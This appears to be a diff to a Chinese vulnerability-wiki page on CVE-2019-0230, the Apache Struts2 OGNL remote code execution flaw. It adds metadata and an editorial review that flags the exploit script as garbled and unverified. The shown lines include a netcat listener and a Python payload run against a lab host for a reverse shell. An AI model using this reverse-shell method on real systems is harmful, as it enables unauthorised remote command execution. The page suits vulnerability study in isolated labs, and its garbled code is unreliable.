@@ -2,9 +2,55 @@
 cve: "CVE-2019-0230"
 version: "Struts 2.0.0 – Struts 2.5.20"
 source: "白阁文库 BaizeSec/bylibrary"
+title: "一、简介"
+product: "Apache Struts2标签OGNL"
+record_type: "vulnerability"
+review_status: "text-reviewed"
+verification_status: "not-reproduced"
+content_status: "needs-review"
+identifier_status: "active"
+primary_identifiers: "CVE-2019-0230; S2-059"
+referenced_identifiers: ""
+identifier_role: "primary"
+prerequisites: "2.0–2.5.20、不可信值经标签强制二次求值；两请求沙箱状态相同"
+affected_versions: "Struts 2.0.0 – Struts 2.5.20"
+source_status: "unknown"
+side_effects: "含反向连接或交互式命令执行方法：会产生出站连接和子进程；目标、监听端与网络须在授权隔离范围内，结束后关闭会话并核对遗留进程。"
+id: "vw-c788b91c257764a77b09c7a4"
+entity_id: "ve-c788b91c257764a77b09c7a4"
+schema_version: "1"
 ---
 
 # 一、简介
+
+<!-- vulwiki-editorial:start -->
+## 校订与适用边界
+
+- 适用前提：2.0–2.5.20、不可信值经标签强制二次求值；两请求沙箱状态相同
+- 证据范围：与240两阶段方法同源，所谓规则仅模糊特征清单且载荷区域描述错误。
+
+### 本次正文校订
+
+- 按实际内容修正 3 处代码围栏语言标记，保留其中方法与请求内容。
+
+### 尚未解决的证据缺口
+
+以下限制仍适用于后文历史材料；相关版本、结果或修复结论不能据此视为已验证：
+
+- Python代码整段被反引号拆碎，无法直接运行
+- 说明攻击机1.129，所贴base64对应目标1.12的风险需重新核对编码目标
+- 表单id在body/query，不是请求头，响应头也不保证包含payload；POST+200+括号不可称有效双向防护规则
+- CVSS8.5缺来源/向量；无正式规则、误报/漏报验证
+- 缺固定测试版本/修复方案，标题Struts2-059及H1简介应规范
+
+### 操作风险与资料使用
+
+- 含反向连接或交互式命令执行方法：会产生出站连接和子进程；目标、监听端与网络须在授权隔离范围内，结束后关闭会话并核对遗留进程。
+
+本页为文本校订，未执行代码、PoC 或目标请求；原图仅保留引用，未据此确认复现成功。
+<!-- vulwiki-editorial:end -->
+
+## 技术正文与历史材料
 
 2020年08月13日，Apache官方发布了Struts2远程代码执行漏洞的风险通告，该漏洞编号为CVE-2019-0230，漏洞等级：高危，漏洞评分：8.5
 
@@ -34,7 +80,7 @@ Struts 2.0.0 – Struts 2.5.20
 
 这里使用vulhub，很方便。
 
-```
+```shell
 docker-compose up -d
 ```
 
@@ -78,13 +124,13 @@ import` `requests``url ``=` `"http://192.168.1.12:8080"``data1 ``=` `{``  ``"id"
 
 1.监听端口
 
-```
+```shell
 nc -lvvp 6666
 ```
 
 2.运行脚本
 
-```
+```shell
 python3 payload.py
 ```
 
